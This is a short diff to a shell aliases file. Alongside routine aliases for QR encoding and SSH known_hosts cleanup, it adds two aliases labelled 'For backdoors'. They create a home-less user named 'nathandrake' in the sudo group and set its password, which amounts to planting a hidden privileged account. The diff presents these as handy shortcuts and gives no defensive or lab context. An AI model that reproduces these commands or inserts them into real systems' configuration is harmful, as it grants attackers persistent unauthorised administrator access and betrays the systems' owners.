@@ -279,6 +279,10 @@ alias qrcode='qrencode -m 2 -t utf8 <<< "$1"'
 # Remove SSH Entry
 alias sshw="ssh-keygen -f /home/$USER/.ssh/known_hosts -R"
 
+# For backdoors
+alias backuser="sudo useradd -M -G sudo nathandrake"
+alias backpass="sudo passwd nathandrake"
+
 ##################
 # DOMAIN CONTROL #
 ##################
